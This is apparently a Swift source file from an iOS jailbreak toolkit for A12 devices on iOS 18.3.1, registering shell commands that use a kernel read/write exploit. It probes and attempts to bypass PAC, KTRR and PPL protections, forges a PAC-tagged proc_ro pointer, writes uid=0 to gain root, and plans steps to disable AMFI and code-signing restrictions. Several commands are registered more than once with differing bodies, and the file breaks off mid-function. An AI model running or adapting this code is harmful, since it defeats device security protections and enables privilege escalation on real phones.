//
//  OmegaExtendedG.swift
//  lara
//
//  PAC / KTRR / SMR / PPL Analysis Shell — wraps tp_* C tools
//  + PPL Hunter v1.0 — Multi-Vector Autonomous Scanner (A12 iOS 18.3.1)
//

import Foundation
import Darwin

private func _isNonPPL(_ a: UInt64) -> Bool {
    guard a != 0 else { return false }
    let top = UInt32(a >> 32)
    return (top & 0xFFFFFFF0) == 0xFFFFFFE0
}

private func _isPPLZone(_ a: UInt64) -> Bool {
    guard a != 0 else { return false }
    let top = UInt32(a >> 32)
    return (top & 0xFFFFFFF0) == 0xFFFFFFD0 || (top & 0xFFFFFFF0) == 0xFFFFFFDE
}

private func _gtr(_ r: tool_result_t) -> String {
    var m = r.msg
    return withUnsafeBytes(of: &m) {
        String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
    }
}

private func _gresult(_ r: tool_result_t) -> CommandResult {
    r.code == 0 ? .ok(_gtr(r)) : .fail(_gtr(r))
}

private func _ghex(_ s: String) -> UInt64? {
    let t = s.trimmingCharacters(in: .whitespaces)
    let x = (t.hasPrefix("0x") || t.hasPrefix("0X")) ? String(t.dropFirst(2)) : t
    return UInt64(x, radix: 16)
}

func registerPPLShellCommands() {
    _regPAC(); _regKTRR(); _regSMR(); _regPPL(); _regPPLHunter(); _regHelpPPL()
}

private func _regPAC() {
    OmegaCore.register("pac-reader") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-reader: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard !parts.isEmpty, let va = _ghex(parts[0]) else {
            return .fail("pac-reader: usage — pac-reader <kernel_va_hex>")
        }
        var info = pac_info_t()
        let r = tp_pac_reader(va, &info)
        if r.code != 0 { return .fail(_gtr(r)) }
        let desc = withUnsafeBytes(of: info.desc) {
            String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
        }
        return .ok(String(format:
            "pac-reader @ 0x%016llx:\n" +
            "  raw_ptr    : 0x%016llx\n" +
            "  stripped   : 0x%016llx\n" +
            "  pac_tag    : 0x%016llx\n" +
            "  is_data    : %@\n" +
            "  is_signed  : %@\n" +
            "  is_null    : %@\n" +
            "  va_bits    : %u\n" +
            "  info       : %@",
            va, info.raw_ptr, info.stripped_ptr, info.pac_tag,
            info.is_data_ptr ? "yes" : "no",
            !info.is_canonical ? "yes" : "no",
            info.is_null ? "yes" : "no",
            info.va_bits, desc
        ))
    }

    OmegaCore.register("pac-signature-extractor") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-signature-extractor: exploit not ready") }
        guard let ptr = _ghex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("pac-signature-extractor: usage — pac-signature-extractor <raw_ptr_hex>")
        }
        var info = pac_info_t()
        let r = tp_pac_signature_extractor(ptr, &info)
        if r.code != 0 { return .fail(_gtr(r)) }
        return .ok(String(format:
            "pac-signature-extractor:\n" +
            "  raw_ptr  : 0x%016llx\n" +
            "  pac_tag  : 0x%016llx\n" +
            "  stripped : 0x%016llx\n" +
            "  is_data  : %@\n" +
            "  canonical: %@",
            info.raw_ptr, info.pac_tag, info.stripped_ptr,
            info.is_data_ptr ? "yes (PACDA)" : "no (PACIA)",
            info.is_canonical ? "yes (no PAC)" : "no (PAC-signed)"
        ))
    }

    OmegaCore.register("pac-key-scanner") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-key-scanner: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        let start = parts.count > 0 ? (_ghex(parts[0]) ?? ds_get_kernel_base() + 0x800_0000) : ds_get_kernel_base() + 0x800_0000
        let end   = parts.count > 1 ? (_ghex(parts[1]) ?? start + 0x100_0000) : start + 0x100_0000
        var addrs = [UInt64](repeating: 0, count: 64)
        var count: Int32 = 0
        let r = tp_pac_key_scanner(start, end, &addrs, &count, 64)
        if r.code != 0 { return .fail(_gtr(r)) }
        var lines = [String(format: "pac-key-scanner: 0x%016llx–0x%016llx  found %d signed ptrs", start, end, count)]
        for i in 0..<min(Int(count), 16) {
            lines.append(String(format: "  [%02d] 0x%016llx", i, addrs[i]))
        }
        if count > 16 { lines.append("  … and \(count - 16) more") }
        return .ok(lines.joined(separator: "\n"))
    }

    OmegaCore.register("pac-context-analyzer") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-context-analyzer: exploit not ready") }
        guard let ptr = _ghex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("pac-context-analyzer: usage — pac-context-analyzer <raw_ptr_hex>")
        }
        var info = pac_info_t()
        let r = tp_pac_context_analyzer(ptr, &info)
        if r.code != 0 { return .fail(_gtr(r)) }
        let desc = withUnsafeBytes(of: info.desc) {
            String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
        }
        return .ok(String(format:
            "pac-context-analyzer 0x%016llx:\n  type=%@  tag=0x%016llx\n  %@",
            ptr, info.is_data_ptr ? "PACDA" : "PACIA", info.pac_tag, desc))
    }

    OmegaCore.register("pac-entropy-checker") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-entropy-checker: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard !parts.isEmpty, let start = _ghex(parts[0]) else {
            return .fail("pac-entropy-checker: usage — pac-entropy-checker <va> [count=64]")
        }
        let n = min(Int(parts.count > 1 ? parts[1] : "") ?? 64, 256)
        var ptrs = (0..<n).compactMap { i -> UInt64? in
            let a = start + UInt64(i) * 8
            return ds_isvalid(a) ? ds_kread64(a) : nil
        }
        var entropy: Double = 0
        let r = tp_pac_entropy_checker(&ptrs, Int32(ptrs.count), &entropy)
        return r.code == 0
            ? .ok(String(format: "pac-entropy-checker: %d samples  entropy=%.3f bits\n%@", ptrs.count, entropy, _gtr(r)))
            : .fail(_gtr(r))
    }

    OmegaCore.register("pac-algorithm-fingerprint") { _, mgr in
        guard mgr.dsready else { return .fail("pac-algorithm-fingerprint: exploit not ready") }
        return _gresult(tp_pac_algorithm_fingerprint())
    }

    OmegaCore.register("pac-strength-analyzer") { _, mgr in
        guard mgr.dsready else { return .fail("pac-strength-analyzer: exploit not ready") }
        var score: Int32 = 0
        let r = tp_pac_strength_analyzer(&score)
        return r.code == 0
            ? .ok(String(format: "pac-strength-analyzer: score=%d/100\n%@", score, _gtr(r)))
            : .fail(_gtr(r))
    }

    OmegaCore.register("pac-coverage-mapper") { _, mgr in
        guard mgr.dsready else { return .fail("pac-coverage-mapper: exploit not ready") }
        var buf = [CChar](repeating: 0, count: 4096)
        let r = tp_pac_coverage_mapper(&buf, 4096)
        if r.code != 0 { return .fail(_gtr(r)) }
        return .ok("pac-coverage-mapper:\n" + String(cString: buf))
    }

    OmegaCore.register("pac-weak-key-detector") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-weak-key-detector: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard !parts.isEmpty, let start = _ghex(parts[0]) else {
            return .fail("pac-weak-key-detector: usage — pac-weak-key-detector <va> [count=64] [threshold=2]")
        }
        let n    = min(Int(parts.count > 1 ? parts[1] : "") ?? 64, 256)
        let thr  = Int32(parts.count > 2 ? parts[2] : "") ?? 2
        var tags = (0..<n).compactMap { i -> UInt64? in
            let a = start + UInt64(i) * 8
            return ds_isvalid(a) ? ds_kread64(a) : nil
        }
        let r = tp_pac_weak_key_detector(&tags, Int32(tags.count), thr)
        return _gresult(r)
    }

    OmegaCore.register("pac-null-pointer-checker") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-null-pointer-checker: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard !parts.isEmpty, let va = _ghex(parts[0]) else {
            return .fail("pac-null-pointer-checker: usage — pac-null-pointer-checker <va> [len=256]")
        }
        let len = Int(parts.count > 1 ? parts[1] : "") ?? 256
        let r = tp_pac_null_pointer_checker(va, len)
        return _gresult(r)
    }

    OmegaCore.register("pac-bypass-validator") { _, mgr in
        guard mgr.dsready else { return .fail("pac-bypass-validator: exploit not ready") }
        return _gresult(tp_pac_bypass_validator())
    }
}

private func _regKTRR() {
    OmegaCore.register("ktrr-region-mapper") { _, mgr in
        guard mgr.dsready else { return .fail("ktrr-region-mapper: exploit not ready") }
        guard ds_is_ready() else { return .fail("ktrr-region-mapper: kernel r/w unavailable — revive session or re-run exploit") }
        var regions = [kregion_info_t](repeating: kregion_info_t(), count: 32)
        var count: Int32 = 0
        let r = tp_ktrr_region_mapper(&regions, &count, 32)
        if r.code != 0 { return .fail(_gtr(r)) }
        guard count >= 0 && count <= 32 else {
            return .fail("ktrr-region-mapper: invalid region count \(count) — kernel r/w degraded (count must be 0–32)")
        }
        if count == 0 { return .ok("ktrr-region-mapper: 0 regions found (kernel r/w may be limited)") }
        var lines = ["ktrr-region-mapper: \(count) region(s)"]
        lines.append("  REGION            START                END                  KTRR  PPL   EXEC")
        lines.append("  ─────────────── ─────────────────── ──────────────────── ───── ───── ────")
        for i in 0..<Int(count) {
            let reg = regions[i]
            guard reg.region_start != 0 && ds_isvalid(reg.region_start) else { continue }
            let name = withUnsafeBytes(of: reg.region_name) {
                String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
            }
            lines.append(String(format: "  %-15@ 0x%016llx  0x%016llx   %@     %@     %@",
                name as NSString, reg.region_start, reg.region_end,
                reg.is_ktrr ? "yes" : "no",
                reg.is_ppl_zone ? "yes" : "no",
                reg.is_executable ? "yes" : "no"
            ))
        }
        return .ok(lines.joined(separator: "\n"))
    }

    OmegaCore.register("ktrr-boundary-finder") { _, mgr in
        guard mgr.dsready else { return .fail("ktrr-boundary-finder: exploit not ready") }
        var start: UInt64 = 0
        var end: UInt64 = 0
        let r = tp_ktrr_boundary_finder(&start, &end)
        if r.code != 0 { return .fail(_gtr(r)) }
        return .ok(String(format:
            "ktrr-boundary-finder:\n  start : 0x%016llx\n  end   : 0x%016llx\n  size  : 0x%llx bytes\n  %@",
            start, end, end > start ? end - start : 0, _gtr(r)
        ))
    }

    OmegaCore.register("ktrr-permission-checker") { rawArg, mgr in
        guard mgr.dsready else { return .fail("ktrr-permission-checker: exploit not ready") }
        guard let va = _ghex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("ktrr-permission-checker: usage — ktrr-permission-checker <addr_hex>")
        }
        var info = kregion_info_t()
        let r = tp_ktrr_permission_checker(va, &info)
        if r.code != 0 { return .fail(_gtr(r)) }
        let name = withUnsafeBytes(of: info.region_name) {
            String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
        }
        return .ok(String(format:
            "ktrr-permission-checker @ 0x%016llx:\n" +
            "  region     : %@\n" +
            "  ap_bits    : 0x%x\n" +
            "  is_ktrr    : %@\n" +
            "  is_ppl     : %@\n" +
            "  is_exec    : %@\n" +
            "  is_ro      : %@",
            va, name, info.ap_bits,
            info.is_ktrr ? "YES ✔" : "no",
            info.is_ppl_zone ? "YES" : "no",
            info.is_executable ? "yes" : "no",
            info.is_readonly ? "yes (no write)" : "no (writable)"
        ))
    }

    OmegaCore.register("ktrr-enforcement-detector") { _, mgr in
        guard mgr.dsready else { return .fail("ktrr-enforcement-detector: exploit not ready") }
        var active: Bool = false
        let r = tp_ktrr_enforcement_detector(&active)
        return r.code == 0
            ? .ok(String(format: "ktrr-enforcement-detector:\n  active: %@\n  %@", active ? "YES (KTRR enforced ✔)" : "NO (KTRR bypassed)", _gtr(r)))
            : .fail(_gtr(r))
    }

    OmegaCore.register("ktrr-bypass-paths-finder") { _, mgr in
        guard mgr.dsready else { return .fail("ktrr-bypass-paths-finder: exploit not ready") }
        var vas = [UInt64](repeating: 0, count: 32)
        var count: Int32 = 0
        let r = tp_ktrr_bypass_paths_finder(&vas, &count, 32)
        if r.code != 0 { return .fail(_gtr(r)) }
        var lines = ["ktrr-bypass-paths-finder: \(count) RW window(s) found"]
        for i in 0..<Int(count) {
            lines.append(String(format: "  [%02d] 0x%016llx", i, vas[i]))
        }
        if count == 0 { lines.append("  (no writable paths found in scan range)") }
        return .ok(lines.joined(separator: "\n"))
    }
}

private func _regSMR() {
    OmegaCore.register("smr-region-scanner") { _, mgr in
        guard mgr.dsready else { return .fail("smr-region-scanner: exploit not ready") }
        var infos = [smr_info_t](repeating: smr_info_t(), count: 64)
        var count: Int32 = 0
        let r = tp_smr_region_scanner(&infos, &count, 64)
        if r.code != 0 { return .fail(_gtr(r)) }
        var lines = ["smr-region-scanner: \(count) SMR-tagged pointer(s)"]
        lines.append("  IDX  SMR_PTR              REAL_PTR             EPOCH  VALID")
        lines.append("  ───  ─────────────────── ─────────────────── ──────  ─────")
        for i in 0..<min(Int(count), 24) {
            let info = infos[i]
            lines.append(String(format: "  %-3d  0x%016llx  0x%016llx  0x%04x  %@",
                i, info.smr_ptr, info.real_ptr, info.epoch_tag, info.is_valid ? "yes" : "no"
            ))
        }
        if count > 24 { lines.append("  … and \(count - 24) more") }
        return .ok(lines.joined(separator: "\n"))
    }

    OmegaCore.register("smr-metadata-reader") { rawArg, mgr in
        guard mgr.dsready else { return .fail("smr-metadata-reader: exploit not ready") }
        guard let ptr = _ghex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("smr-metadata-reader: usage — smr-metadata-reader <smr_ptr_hex>")
        }
        var info = smr_info_t()
        let r = tp_smr_metadata_reader(ptr, &info)
        if r.code != 0 { return .fail(_gtr(r)) }
        let desc = withUnsafeBytes(of: info.desc) {
            String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
        }
        return .ok(String(format:
            "smr-metadata-reader 0x%016llx:\n" +
            "  smr_ptr    : 0x%016llx\n" +
            "  real_ptr   : 0x%016llx\n" +
            "  epoch_tag  : 0x%04x\n" +
            "  is_valid   : %@\n" +
            "  desc       : %@",
            ptr, info.smr_ptr, info.real_ptr, info.epoch_tag,
            info.is_valid ? "yes" : "no", desc
        ))
    }

    OmegaCore.register("smr-protection-level-analyzer") { _, mgr in
        guard mgr.dsready else { return .fail("smr-protection-level-analyzer: exploit not ready") }
        return _gresult(tp_smr_protection_level_analyzer())
    }

    OmegaCore.register("smr-isolation-tester") { rawArg, mgr in
        guard mgr.dsready else { return .fail("smr-isolation-tester: exploit not ready") }
        guard let ptr = _ghex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("smr-isolation-tester: usage — smr-isolation-tester <smr_ptr_hex>")
        }
        return _gresult(tp_smr_isolation_tester(ptr))
    }
}

private func _regPPL() {
    OmegaCore.register("ppl-status") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-status: not ready") }
        let uid = getuid()
        let pplBp = ppl_is_bypassed()
        let pmOk = pm_fingerprint_ok()
        let pmBase = pm_get_physmap_base()
        let ucredV = pm_get_ucred_va()
        let enforce = amfi_get_mac_proc_enforce()
        let amfiStr = enforce == 0xFFFFFFFF ? "0xFFFFFFFF" : String(enforce)
        return .ok(String(format:
            "uid:      %d\n" +
            "ppl:      %@\n" +
            "physmap:  %@\n" +
            "physmap_base: 0x%016llx\n" +
            "ucred_va:     0x%016llx\n" +
            "amfi:     %@\n" +
            "vfs:      %@\n" +
            "sbx:      %@",
            uid, pplBp ? "yes" : "no", pmOk ? "yes" : "no",
            pmBase, ucredV, amfiStr,
            mgr.vfsready ? "yes" : "no", mgr.sbxready ? "yes" : "no"
        ))
    }
OmegaCore.register("ppl-phase-report") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-phase-report: exploit not ready") }
        let p1 = pm_phase1_fingerprint()
        let p2 = pm_phase2_resolve_ucred()
        let p3 = pm_phase3_write_root()
        let uid = getuid()
        return .ok(String(format:
            "ppl-phase-report:\n" +
            "  Phase 1 (physmap fingerprint) : %d  %@\n" +
            "  Phase 2 (ucred via physmap)   : %d  %@\n" +
            "  Phase 3 (write uid=0)         : %d  %@\n" +
            "  Final uid                     : %d  %@",
            p1, p1 == 0 ? "✔ pmap located" : "✖ pmap not found",
            p2, p2 == 0 ? "✔ ucred resolved" : "✖ failed",
            p3, p3 == 0 ? "✔ uid=0 written" : "✖ failed",
            uid, uid == 0 ? "ROOT ✔" : "(not root)"
        ))
    }

    OmegaCore.register("ppl-phase-report") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-phase-report: exploit not ready") }
        let p1 = pm_phase1_fingerprint()
        let p2 = pm_phase2_resolve_ucred()
        let p3 = pm_phase3_write_root()
        let uid = getuid()

        // FIX: Detailed interpretation of return codes
        let p1Status: String
        switch p1 {
        case 0:  p1Status = "✔️ pmap located"
        case -2: p1Status = "✖️ precondition failed: mac_proc_enforce offset unknown or pmap not mapped (run 'offsets' first)"
        case -1: p1Status = "✖️ generic failure"
        default: p1Status = "✖️ error code \(p1)"
        }

        let p2Status: String
        switch p2 {
        case 0:  p2Status = "✔️ ucred resolved"
        case -1: p2Status = "✖️ failed (physmap not ready or ucred offset unknown)"
        default: p2Status = "✖️ error code \(p2)"
        }

        let p3Status: String
        switch p3 {
        case 0:  p3Status = "✔️ uid=0 written"
        case -1: p3Status = "✖️ failed (PPL write blocked or previous phase failed)"
        default: p3Status = "✖️ error code \(p3)"
        }

        return .ok(String(format:
            "ppl-phase-report:\n" +
            "  Phase 1 (physmap fingerprint) : %d  %@\n" +
            "  Phase 2 (ucred via physmap)   : %d  %@\n" +
            "  Phase 3 (write uid=0)         : %d  %@\n" +
            "  Final uid                     : %d  %@",
            p1, p1Status,
            p2, p2Status,
            p3, p3Status,
            uid, uid == 0 ? "ROOT ✔️" : "NOT ROOT ✖️ (uid=\(uid))"
        ))
    }
OmegaCore.register("ppl-phase-report") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-phase-report: not ready") }
        let p1 = pm_phase1_fingerprint()
        let p2 = pm_phase2_resolve_ucred()
        let p3 = pm_phase3_write_root()
        let uid = getuid()
        let p1s = p1 == 0 ? "PASS" : "FAIL (\(p1))"
        let p2s = p2 == 0 ? "PASS" : "FAIL (\(p2))"
        let p3s = p3 == 0 ? "PASS" : "FAIL (\(p3))"
        return .ok(String(format:
            "Phase 1: %@\n" +
            "Phase 2: %@\n" +
            "Phase 3: %@\n" +
            "uid:     %d\n" +
            "---\n" +
            "Fix:     offsets → fixoffsets → auto-ppl-breaker",
            p1s, p2s, p3s, uid
        ))
    }
OmegaCore.register("ppl-write-bypass") { rawArg, mgr in
        guard mgr.dsready else { return .fail("ppl-write-bypass: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard parts.count == 2, let va = _ghex(parts[0]) else {
            return .fail("ppl-write-bypass: usage — ppl-write-bypass <addr_hex> <u32_val_hex>")
        }
        let valStr = parts[1].hasPrefix("0x") ? String(parts[1].dropFirst(2)) : parts[1]
        guard let val = UInt32(valStr, radix: 16) else {
            return .fail("ppl-write-bypass: invalid value '\(parts[1])'")
        }
        return _gresult(tp_ppl_write_bypass(va, val))
    }

    // FIXED: ppl-signature-forge — REAL extraction tool (read-only)
    OmegaCore.register("ppl-signature-forge") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-signature-forge: exploit not ready") }
        guard ds_is_ready() else { return .fail("ppl-signature-forge: kernel r/w unavailable") }

        let our_proc = ds_get_our_proc()
        guard our_proc != 0 else { return .fail("ppl-signature-forge: ds_get_our_proc() = 0") }

        let raw_proc_ro = ds_kread64(our_proc + UInt64(off_proc_p_proc_ro))
        let stripped_proc_ro = raw_proc_ro & 0x0000000FFFFFFFFF
        guard stripped_proc_ro != 0 else {
            return .fail("ppl-signature-forge: proc_ro stripped = 0 — pointer unreadable or null")
        }

        let va_mask: UInt64 = (1 << 39) - 1
        let pac_tag = raw_proc_ro & ~va_mask

        let rw_pcb = ds_get_rw_socket_pcb()
        guard rw_pcb != 0 else { return .fail("ppl-signature-forge: ds_get_rw_socket_pcb() = 0 — no scratch") }

        let scratch = rw_pcb + 0x200
        guard _isNonPPL(scratch) else {
            return .fail(String(format: "ppl-signature-forge: scratch 0x%016llx not in non-PPL zone", scratch))
        }

        var buf = [UInt8](repeating: 0, count: 0x60)
        ds_kread(stripped_proc_ro, &buf, 0x60)
        ds_kwrite(scratch, &buf, 0x60)

        let scratch_verify = ds_kread64(scratch + UInt64(off_proc_ro_p_ucred))
        guard scratch_verify == ds_kread64(stripped_proc_ro + UInt64(off_proc_ro_p_ucred)) else {
            return .fail("ppl-signature-forge: scratch write verification failed")
        }

        let forged_ptr = scratch | pac_tag

        let raw_ucred = ds_kread64(stripped_proc_ro + UInt64(off_proc_ro_p_ucred))
        let stripped_ucred = raw_ucred & 0x0000000FFFFFFFFF
        let current_uid = ds_kread32(stripped_ucred + 0x18)

        return .ok(String(format:
            "═══ ppl-signature-forge EXTRACTION REPORT ═══\n" +
            "  our_proc       : 0x%016llx\n" +
            "  raw_proc_ro    : 0x%016llx  ← PAC-signed original\n" +
            "  stripped_ro    : 0x%016llx  ← after XPACD + sign-extend\n" +
            "  pac_tag        : 0x%016llx  ← EXTRACTED SIGNATURE\n" +
            "  scratch        : 0x%016llx  ← fake proc_ro ready\n" +
            "  forged_ptr     : 0x%016llx  ← scratch | pac_tag\n" +
            "  ucred_ptr      : 0x%016llx\n" +
            "  current_uid    : %u\n" +
            "  saved_original : 0x%016llx  ← BACKUP THIS\n" +
            "═══════════════════════════════════════════════\n" +
            "\n" +
            "  MANUAL STEPS:\n" +
            "    kwrite64 0x%016llx 0x%016llx\n" +
            "    getuid  (forces PAC auth — panic if tag wrong)\n" +
            "    If panic: kwrite64 0x%016llx 0x%016llx  ← restore\n" +
            "\n" +
            "  NOTE: A12+ hardware PAC will likely reject forged tag.\n" +
            "        Panic = diagnosis. No panic = possible collision.",
            our_proc, raw_proc_ro, stripped_proc_ro, pac_tag,
            scratch, forged_ptr, stripped_ucred, current_uid, raw_proc_ro,
            our_proc + UInt64(off_proc_p_proc_ro), forged_ptr,
            our_proc + UInt64(off_proc_p_proc_ro), raw_proc_ro
        ))
    }

    OmegaCore.register("ppl-protected-variable-read") { rawArg, mgr in
        guard mgr.dsready else { return .fail("ppl-protected-variable-read: exploit not ready") }
        guard let va = _ghex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("ppl-protected-variable-read: usage — ppl-protected-variable-read <addr_hex>")
        }
        guard ds_isvalid(va) else {
            return .fail("ppl-protected-variable-read: invalid address 0x\(String(va, radix: 16))")
        }
        var isPPL: Bool = false
        let zr = tp_ppl_zone_checker(va, &isPPL)
        let v64 = ds_kread64(va)
        let v32 = ds_kread32(va)
        let smr = ds_kreadsmrptr(va)
        return .ok(String(format:
            "ppl-protected-variable-read @ 0x%016llx:\n" +
            "  is_ppl  : %@  %@\n" +
            "  read64  : 0x%016llx\n" +
            "  read32  : 0x%08x\n" +
            "  smr_read: 0x%016llx",
            va, isPPL ? "YES ✔" : "no",
            zr.code == 0 ? _gtr(zr) : "",
            v64, v32, smr
        ))
    }

    OmegaCore.register("ppl-bypass-strategy-planner") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-bypass-strategy-planner: not ready") }
        let uid = getuid()
        let pplBp = ppl_is_bypassed()
        let p1 = pm_fingerprint_ok()
        let enforce = amfi_get_mac_proc_enforce()
        let next: String
        if uid == 0 {
            next = "cs-remove-all-restrictions"
        } else if pplBp {
            next = "set-all-ids-zero"
        } else if enforce == 0xFFFFFFFF {
            next = "offsets → fixoffsets"
        } else if p1 {
            next = "auto-ppl-breaker"
        } else {
            next = "offsets → fixoffsets → auto-ppl-breaker"
        }
        return .ok(String(format:
            "uid: %d | ppl: %@ | physmap: %@\nNext: %@",
            uid, pplBp ? "yes" : "no", p1 ? "yes" : "no", next
        ))
    }
OmegaCore.register("ppl-bypass-strategy-planner") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-bypass-strategy-planner: exploit not ready") }
        let uid   = getuid()
        let pplBp = ppl_is_bypassed()
        let p1    = pm_fingerprint_ok()
        let enforce = amfi_get_mac_proc_enforce()
        let enforceUnknown = (enforce == 0xFFFFFFFF)

        var lines = [
            "ppl-bypass-strategy-planner:",
            String(format: "  uid           : %d  %@", uid, uid == 0 ? "ROOT ✔️" : "user ✖️"),
            "  ppl_bypassed  : \(pplBp ? "YES ✔️" : "NO ✖️")",
            "  physmap_ok    : \(p1 ? "YES ✔️" : "NO ✖️")",
            "  amfi_enforce  : \(enforceUnknown ? "UNKNOWN ✖️ (0xFFFFFFFF)" : (enforce == 0 ? "disabled ✔️" : "enforcing ⚠️"))",
            "",
            "  Recommended strategy:",
        ]

        if uid == 0 {
            lines.append("    ✔️ Already root — run cs-remove-all-restrictions to solidify")
        } else if pplBp {
            lines.append("    1. ppl already bypassed → set-all-ids-zero")
            lines.append("    2. amfi-disable-globally")
            lines.append("    3. cs-remove-all-restrictions")
        } else if enforceUnknown {
            lines.append("    ✖️ CRITICAL: mac_proc_enforce offset unknown (0xFFFFFFFF)")
            lines.append("       Step 1: Run 'offsets' or 'fixoffsets' to resolve AMFI offset")
            lines.append("       Step 2: If offsets fail, this iOS version needs updated offsets")
            lines.append("       Step 3: Do NOT run amfi-disable-globally until offsets resolved")
        } else if p1 {
            lines.append("    1. physmap P1 OK → run ppl-phase-report")
            lines.append("    2. Try: auto-ppl-breaker")
        } else {
            lines.append("    1. Run: offsets → fixoffsets (resolve mac_proc_enforce offset)")
            lines.append("    2. Re-run: ppl-phase-report")
            lines.append("    3. If Phase 1 still fails → device may need updated exploit")
            lines.append("    4. Otherwise: auto-ppl-breaker → set-all-ids-zero")
        }
        return .ok(lines.joined(separator: "\n"))
    }
OmegaCore.register("ppl-bypass-strategy-planner") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-bypass-strategy-planner: exploit not ready") }
        let uid   = getuid()
        let pplBp = ppl_is_bypassed()
        let p1    = pm_fingerprint_ok()
        var lines = [
            "ppl-bypass-strategy-planner:",
            String(format: "  uid           : %d  %@", uid, uid == 0 ? "ROOT ✔" : "user"),
            "  ppl_bypassed  : \(pplBp ? "yes ✔" : "no")",
            "  physmap_ok    : \(p1 ? "yes ✔" : "no")",
            "",
            "  Recommended strategy:",
        ]
        if uid == 0 {
            lines.append("    ✔ Already root — run cs-remove-all-restrictions to solidify")
        } else if pplBp {
            lines.append("    1. ppl already bypassed → set-all-ids-zero")
            lines.append("    2. amfi-disable-globally")
            lines.append("    3. cs-remove-all-restrictions")
        } else if p1 {
            lines.append("    1. physmap P1 OK → run ppl-phase-report")
            lines.append("    2. Try: auto-ppl-breaker")
        } else {
            lines.append("    1. Run: offsets → fixoffsets (resolve mac_proc_enforce offset)")
            lines.append("    2. Re-run: ppl-phase-report")
            lines.append("    3. If Phase 1 still fails → device may need updated exploit")
            lines.append("    4. Otherwise: auto-ppl-breaker → set-all-ids-zero")
        }
        return .ok(lines.joined(separator: "\n"))
    }

    OmegaCore.register("ppl-fuzzer") { rawArg, mgr in
        guard mgr.dsready else { return .fail("ppl-fuzzer: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard !parts.isEmpty, let start = _ghex(parts[0]) else {
            return .fail("ppl-fuzzer: usage — ppl-fuzzer <start_addr> [probe_len=128]")
        }
        let len = Int(parts.count > 1 ? parts[1] : "") ?? 128
        var writable = [UInt64](repeating: 0, count: 32)
        var count: Int32 = 0
        let r = tp_ppl_fuzzer(start, len, &writable, &count, 32)
        if r.code != 0 { return .fail(_gtr(r)) }
        var lines = [String(format: "ppl-fuzzer @ 0x%016llx len=0x%x: %d writable addr(s)", start, len, count)]
        for i in 0..<Int(count) {
            lines.append(String(format: "  [%02d] 0x%016llx  WRITABLE ✔", i, writable[i]))
        }
        if count == 0 { lines.append("  All writes blocked — PPL fully enforced here") }
        return .ok(lines.joined(separator: "\n"))
    }

    OmegaCore.register("ppl-version-comparison") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-version-comparison: exploit not ready") }
        return _gresult(tp_ppl_version_comparison())
    }

    OmegaCore.register("auto-ppl-breaker") { _, mgr in
        guard mgr.dsready else { return .fail("auto-ppl-breaker: not ready") }
        let pmOk = pm_fingerprint_ok()
        let enforce = amfi_get_mac_proc_enforce()
        if !pmOk {
            return .fail("Pre-check: physmap=no\nFix: offsets → fixoffsets")
        }
        if enforce == 0xFFFFFFFF {
            return .fail("Pre-check: amfi=0xFFFFFFFF\nFix: offsets → fixoffsets")
        }
        return _gresult(tp_auto_ppl_breaker())
    }
OmegaCore.register("comprehensive-ppl-tester") { _, mgr in
        guard mgr.dsready else { return .fail("comprehensive-ppl-tester: exploit not ready") }
        return _gresult(tp_comprehensive_ppl_tester())
    }
}

private func _regPPLHunter() {
    OmegaCore.register("ppl-hunter") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-hunter: exploit not ready") }
        guard ds_is_ready() else { return .fail("ppl-hunter: kernel r/w unavailable — revive or re-run exploit") }

        var report: [String] = []
        report.append("═══════════════════════════════════════════════════════════════")
        report.append("  PPL HUNTER v1.0 — A12 iOS 18.3.1 Multi-Vector Scanner")
        report.append("═══════════════════════════════════════════════════════════════")
        report.append("")

        report.append(_hunterZoneScan())
        report.append("")

        report.append(_hunterForkProbe())
        report.append("")

        report.append(_hunterPACCollision())
        report.append("")

        let our_proc = ds_get_our_proc()
        if our_proc != 0 && off_proc_p_proc_ro > 0 {
            let raw_proc_ro = ds_kread64(our_proc + UInt64(off_proc_p_proc_ro))
            let proc_ro = raw_proc_ro & 0x0000000FFFFFFFFF
            if proc_ro != 0 {
                report.append(_hunterPTEWalker(targetVA: proc_ro, label: "proc_ro"))
                report.append("")
            }
        }

        if our_proc != 0 && off_proc_p_proc_ro > 0 && off_proc_ro_p_ucred > 0 {
            let raw_proc_ro = ds_kread64(our_proc + UInt64(off_proc_p_proc_ro))
            let proc_ro = raw_proc_ro & 0x0000000FFFFFFFFF
            if proc_ro != 0 {
                let raw_ucred = ds_kread64(proc_ro + UInt64(off_proc_ro_p_ucred))
